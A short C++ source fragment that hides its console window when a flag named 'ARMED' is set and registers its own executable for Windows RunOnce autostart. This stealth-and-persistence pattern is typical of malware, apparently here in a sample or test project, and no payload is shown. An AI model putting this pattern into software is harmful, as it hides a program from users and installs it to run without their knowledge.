#include "pch.h"
#include "example.h"

int example::start() {
	if constexpr (ARMED) FreeConsole();

	TCHAR location[MAX_PATH];
	GetModuleFileName(NULL, location, MAX_PATH);
	autostart::addto_runonce(location);

	return 0;
}